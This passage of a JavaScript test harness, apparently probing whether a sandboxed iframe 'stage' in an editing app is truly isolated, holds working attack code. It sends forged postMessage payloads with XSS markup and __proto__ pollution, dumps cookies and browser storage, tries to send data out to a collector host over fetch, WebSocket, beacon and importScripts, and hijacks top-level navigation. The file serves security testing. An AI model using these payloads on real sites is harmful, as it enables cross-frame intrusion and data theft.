  t("insertAdjacentElement", () => host.insertAdjacentElement("beforeend", make()));
  t("Range.insertNode", () => { const r = document.createRange(); r.selectNodeContents(host); r.insertNode(make()); });
  t("Range.surroundContents", () => { const a = document.createElement("span"); host.appendChild(a); const r = document.createRange(); r.selectNode(a); r.surroundContents(make()); });
  t("片段 append", () => { const fr = document.createDocumentFragment(); Node.prototype.appendChild.call(fr, make()); host.append(fr); });
  t("document.documentElement.appendChild", () => document.documentElement.appendChild(make()));
  t("document.body.append", () => document.body.append(make()));
  t("shadow root appendChild", () => { const d = document.createElement("div"); host.appendChild(d); d.attachShadow({ mode: "open" }).appendChild(make()); });
  t("moveBefore", () => { if (typeof host.moveBefore !== "function") throw new TypeError("没有这个方法"); host.moveBefore(make(), null); });
  t("Reflect.apply(原型上的方法)", () => Reflect.apply(Node.prototype.appendChild, host, [make()]));
  t("Function.prototype.call 被改写后 appendChild", () => { const keep = Function.prototype.call; Function.prototype.call = function () { return undefined; }; try { host.appendChild(make()); } finally { Function.prototype.call = keep; } });
  await wait(300);
  out["收尾时的子框架数"] = String(window.length);
  host.remove();
  return out;
}

/* ------------------------------------------------------------------ 伪造:向父页发各种消息 */
export function forgedMessages(ctx) {
  // 超范围的数现拼出来:这份源码(连同转译结果)会进编辑页面的转译缓存,字面量写在这里的话探针在父页存储里找这个数时会找到源码本身
  const HUGE = Number("7.77e" + "98");
  const M = ctx.magic, big = "x".repeat(1024 * 1024);
  const xss = "<img src=x onerror=\"parent.__pcXss=1;window.__pcXss=1\"><script>window.__pcXss=1</" + "script><div data-pcboundary-html=\"" + ctx.tag + "\">" + M + "</div>";
  const list = [
    { type: "pc-stage-ready", hostCapabilities: { prerender: "yes", offscreenGl: 1, compact: { a: 1 }, lowest: "x", measure: [], catchUp: null, stageId: "Z", ticket: M } },
    { type: "pc-stage-ready", hostCapabilities: big },
    { type: "pc-stage-isolation", report: { ok: true, crossOrigin: true, csp: "header", egress: "allowlist", hardened: true, trustedTypes: "enforced", reasons: [], extra: M } },
    { type: "pc-stage-isolation", report: { ok: true } },
    { type: "pc-stage-isolation", report: big },
    { type: "pc-stage-cards", stamp: 1e308 },
    { type: "pc-rpc-reply", id: 1, ok: true, result: { ticket: M, elapsedMs: -1e99, steps: [1e99, NaN, Infinity] } },
    { type: "pc-rpc-reply", id: -1, ok: true, result: big },
    { type: "pc-rpc-reply", id: 2, ok: false, error: big },
    { type: "frame", sec: 1e99 }, { type: "frame", sec: -5 }, { type: "frame", sec: "1" }, { type: "ended", sec: NaN },
    { type: "settled", sec: 1, clipIds: new Array(100000).fill(M) },
    { type: "probe", identityKey: "FORGED-" + M, fps: 30, stepMs: HUGE, inlineMs: -HUGE, rasterMs: HUGE, serializeMs: HUGE, catchUpMs: HUGE, kind: "stepped", seekMs: HUGE },
    { type: "probe", identityKey: "FORGED-" + M, fps: 1e9, stepMs: Infinity, inlineMs: NaN, rasterMs: "1", serializeMs: null, catchUpMs: {}, kind: "sink" },
    { type: "demote", clipId: big }, { type: "demote", clipId: { toString: 1 } },
    { type: "probe-frame", clipId: "pcboundary", localFrame: 0, html: xss },
    { type: "bake-frame", session: "pcboundary", clipId: "pcboundary", localFrame: 1e99, hash: "zz", bytes: -1, htmlRaw: new ArrayBuffer(8) },
    { type: "bake-frame", session: M, clipId: M, localFrame: 0, hash: "0".repeat(64), bytes: HUGE, htmlRaw: new TextEncoder().encode(xss).buffer },
    { type: "mediaReady", sec: { valueOf: 1 } },
    { type: "auth.ticket", kind: "asset", access: "rw" },
    { type: "pc-give-me-the-ticket", reqId: M },
    { type: "__proto__", constructor: { prototype: { polluted: M } } },
    null, 42, big, [], { type: 7 },
  ];
  let sent = 0;
  for (const m of list) { try { parent.postMessage(m, "*"); sent++; } catch (e) { /* 克隆不了的不算 */ } }
  try { parent.postMessage(JSON.parse('{"type":"frame","sec":1,"__proto__":{"polluted":"' + M + '"}}'), "*"); sent++; } catch (e) { /* 忽略 */ }
  return { sent: String(sent) };
}

/* ------------------------------------------------------------------ 素材效果卡那一半:凭 cookie 读素材、进 GPU */
export async function mediaWork(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const url = "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash;
  const glRead = (bmp) => { const c = document.createElement("canvas"); c.width = c.height = 4; const gl = c.getContext("webgl2", { preserveDrawingBuffer: true }); if (!gl) throw new Error("没有 webgl2"); const tex = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, tex); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, bmp); const fb = gl.createFramebuffer(); gl.bindFramebuffer(gl.FRAMEBUFFER, fb); gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0); const px = new Uint8Array(4); gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, px); return Array.from(px).join(","); };
  await t("range", () => fetch(url, { headers: { Range: "bytes=0-7" } }).then(async (r) => r.status + " " + r.headers.get("content-range") + " " + Array.from(new Uint8Array(await r.arrayBuffer())).join(",")));
  await t("img-canvas-2d", () => new Promise((res, rej) => { const i = new Image(); i.onload = () => { const c = document.createElement("canvas"); c.width = c.height = 4; const g = c.getContext("2d"); g.drawImage(i, 0, 0); res(Array.from(g.getImageData(0, 0, 1, 1).data).join(",")); }; i.onerror = () => rej(new Error("图片取不到")); i.src = url; }));
  await t("img-webgl2", async () => { const r = await fetch(url); const bmp = await createImageBitmap(await r.blob(), { premultiplyAlpha: "none" }); return glRead(bmp); });
  await t("other-sid", () => fetch("/media-s/" + "0".repeat(32) + "/media/" + ctx.mediaHash).then((r) => "状态:" + r.status));
  await t("legacy-route-without-ticket", () => fetch("/media/api/asset/media/" + ctx.mediaHash).then((r) => "状态:" + r.status));
  await t("post-to-media", () => fetch(url, { method: "POST", body: "x" }).then((r) => "状态:" + r.status));
  await t("other-namespace", () => fetch("/media-s/" + ctx.sid + "/snap/" + ctx.mediaHash).then((r) => "状态:" + r.status));
  await t("chunks-route", () => fetch(url + "/chunks").then((r) => "状态:" + r.status));
  return out;
}

/* ------------------------------------------------------------------ 声音那一半:在 Worker 里跑 */
export async function workerAttempts(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const E = ctx.collector, tag = ctx.tag;
  await t("w.globals", () => typeof self.parent + "/" + typeof self.top + "/" + typeof self.document + "/" + typeof self.localStorage + "/" + typeof self.opener);
  await t("w.RTCPeerConnection", () => typeof self.RTCPeerConnection + "/" + typeof self.webkitRTCPeerConnection);
  await t("w.indexedDB", () => indexedDB.databases().then((d) => text(d.map((x) => x.name))));
  await t("w.cookieStore", () => (typeof cookieStore === "undefined" ? "没有这个接口" : cookieStore.getAll().then((all) => text(all.map((c) => c.name + "=" + c.value)))));
  await t("w.caches", () => caches.keys().then(text));
  await t("w.opfs", async () => { const d = await navigator.storage.getDirectory(); const n = []; for await (const k of d.keys()) n.push(k); return text(n); });
  await t("w.location", () => self.location.href);
  await t("w.fetch", () => fetch(E + "/x?wfetch=" + tag).then((r) => "到达:" + r.status));
  await t("w.fetch-no-cors", () => fetch(E + "/x?wnocors=" + tag, { mode: "no-cors" }).then(() => "到达"));
  await t("w.xhr", () => new Promise((res) => { const x = new XMLHttpRequest(); x.onload = () => res("到达"); x.onerror = () => res("拦下"); x.open("GET", E + "/x?wxhr=" + tag); x.send(); }));
  await t("w.websocket", () => new Promise((res) => { const w = new WebSocket(E.replace("http", "ws") + "/ws?wws=" + tag); w.onopen = () => res("到达"); w.onerror = () => res("拦下"); }));
  await t("w.eventsource", () => new Promise((res) => { const s = new EventSource(E + "/x?wes=" + tag); s.onopen = () => res("到达"); s.onerror = () => { s.close(); res("拦下"); }; }));
  await t("w.importScripts", () => { importScripts(E + "/x.js?wimport=" + tag); return "到达"; });
  await t("w.dynamic-import", () => new Function("u", "return imp" + "ort(u)")(E + "/x.js?wdynimport=" + tag).then(() => "到达"));
  await t("w.nested-worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?wworker=" + tag); w.onerror = () => res("拦下"); later(() => res("已建"), 500); } catch (e) { res("抛错:" + e.name); } }));
  await t("w.webtransport", () => { if (typeof WebTransport !== "function") return "没有这个接口"; const w = new WebTransport("https://127.0.0.1:" + ctx.collectorPort + "/wwt"); return w.ready.then(() => "到达", () => "拦下"); });
  await t("w.beacon", () => (self.navigator.sendBeacon ? String(self.navigator.sendBeacon(E + "/x?wbeacon=" + tag, "d")) : "没有这个接口"));
  if (ctx.sid && ctx.mediaHash) await t("w.media", () => fetch(self.location.origin === "null" ? "" : (ctx.stageOrigin || self.location.origin) + "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash).then((r) => "状态:" + r.status + " " + text(Array.from(r.headers.entries()))));
  await t("w.pcm", () => { const a = new Float32Array(4800); for (let i = 0; i < a.length; i++) a[i] = Math.sin(i / 20); return "采样:" + a.length; });
  return out;
}

/* ------------------------------------------------------------------ 导航:把舞台自己或顶层带走(会带死舞台,探针每种单开一页) */
export function navAttack(ctx) {
  const E = ctx.collector, tag = ctx.tag, nav = ctx.nav;
  try {
    if (nav === "self") location.href = E + "/x?navself=" + tag;
    if (nav === "assign") location.assign(E + "/x?navassign=" + tag);
    if (nav === "top") top.location.href = E + "/x?navtop=" + tag;
    if (nav === "parent") parent.location.href = E + "/x?navparent=" + tag;
    if (nav === "open") window.open(E + "/x?navopen=" + tag);
    if (nav === "open-top") window.open(E + "/x?navopentop=" + tag, "_top");
    if (nav === "meta") { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + E + "/x?navmeta=" + tag; document.head.appendChild(m); }
    if (nav === "anchor") { const a = document.createElement("a"); a.href = E + "/x?navanchor=" + tag; a.target = "_top"; document.body.appendChild(a); a.click(); }
    if (nav === "anchor-blank") { const a = document.createElement("a"); a.href = E + "/x?navblank=" + tag; a.target = "_blank"; a.rel = "opener"; document.body.appendChild(a); a.click(); }
    if (nav === "form-self") { const f = document.createElement("form"); f.action = E + "/x?form=" + tag; f.method = "POST"; f.target = "_self"; document.body.appendChild(f); f.submit(); }
    if (nav === "form-blank") { const f = document.createElement("form"); f.action = E + "/x?formblank=" + tag; f.method = "GET"; f.target = "_blank"; document.body.appendChild(f); f.submit(); }
    if (nav === "a-download") { const a = document.createElement("a"); a.href = E + "/x?download=" + tag; a.download = "x"; document.body.appendChild(a); a.click(); }
    if (nav === "form-top") { const f = document.createElement("form"); f.action = E + "/x?navform=" + tag; f.target = "_top"; document.body.appendChild(f); f.submit(); }
    return "已发起";
  } catch (e) {
    return "抛错:" + (e && e.name);
  }
}

/** 一张卡把上面几组连着跑一遍(用户卡与素材效果卡的入口都调它;素材效果卡多一组读素材进 GPU) */
export async function runAll(ctx) {
  const result = { tag: ctx.tag, at: Date.now() };
  result.parent = await parentReads(ctx);
  // 一边听父页的消息,一边:把读得到的一切倒出来、(素材效果卡)凭 cookie 读素材进 GPU、试着造一个子框架(加固拦下并上报,
  // 父页改判、把取档策略重发给两台 —— 听到的消息里不该有票据)
  const heard = [];
  const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("消息读不了"); } };
  addEventListener("message", onMessage);
  result.dump = await dumpEverything(ctx);
  if (ctx.graph && ctx.sid && ctx.mediaHash) result.media = await mediaWork(ctx);
  result.firstBreach = await hardenAttacks({ ...ctx, only: ["createElement"] });
  await wait(ctx.listenAfterMs || 4000);
  removeEventListener("message", onMessage);
  result.heard = { "parent-messages": heard.join("\n") };
  // 这时闸门已经因为上面那一下关上了;照样硬跑,看的是浏览器与加固拦不拦得住
  result.forged = forgedMessages(ctx);
  result.exfil = await exfilAttacks({ ...ctx, only: ["fetch", "img", "css-bg", "script"] });
  result.harden = await hardenAttacks(ctx);
  return result;
}
